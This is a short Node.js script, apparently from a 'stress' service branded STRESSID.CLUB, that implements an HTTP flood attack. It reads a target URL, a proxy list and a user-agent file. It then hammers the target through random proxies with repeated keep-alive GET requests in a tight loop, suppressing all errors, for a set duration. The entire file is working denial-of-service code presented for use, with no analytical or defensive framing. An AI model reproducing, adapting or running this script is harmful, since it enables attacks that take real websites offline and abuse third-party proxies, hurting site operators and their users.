require('events').EventEmitter.defaultMaxListeners = 0;
process.on("uncaughtException", (e) => {});
process.on("unhandledRejection", (e) => {});
const fs = require("fs");
if (process.argv.length != 7)
  return console.log("node socketv4.js host proxy time rate threads");
const args = {
  host: process.argv[2],
  proxy: process.argv[3],
  time: process.argv[4],
  reqs: process.argv[5],
  threads: process.argv[6],
};
var useragentsss = fs.readFileSync('ua.txt', 'utf-8').replace(/\r/g, '').split('\n');
	const urlParsed = new URL(args.host);
	const proxies = fs
	  .readFileSync(args.proxy, "utf-8")
	  .match(/(\d{1,3}\.){3}\d{1,3}\:\d{1,5}/g);
	var genPayload = () =>
	  `GET ${urlParsed.pathname} HTTP/1.1
	  \r\n
	  Host: ${urlParsed.host}
	  \r\n
	  User-Agent: ${useragentsss[Math.floor(Math.random() * useragentsss.length)]}
	  \r\n
	  Connection: Keep-Alive
	  \r\n\r\n`;
	var payloads = [];
	
	console.log('\x1b[36m%s\x1b[0m', 'OWNER: STRESSID.CLUB | START!');
	
	function flood() {
	  var proxy = proxies[Math.floor(Math.random() * proxies.length)].split(":");
	  var document = payloads.find((payload) => proxy[0] == payload.proxy);
	  if (!document) {
		let temp = {
		  proxy: proxy[0],
		  payload: genPayload()
		};
		payloads.push(temp);
		document = temp;
	  }
	  var client = require("net").Socket();
	  client.connect(proxy[1], proxy[0]);
	  client.setTimeout(60000);
	  for (var i = 0; i < args.reqs; ++i) client.write(document.payload);
	  client.on("data", () => setTimeout(() => client.destroy(), 5000));
	}

	setInterval(() => {
		flood();
		flood();
		flood();
		flood();		
	});		  
	  
setTimeout(() => process.exit(0), args.time * 1000);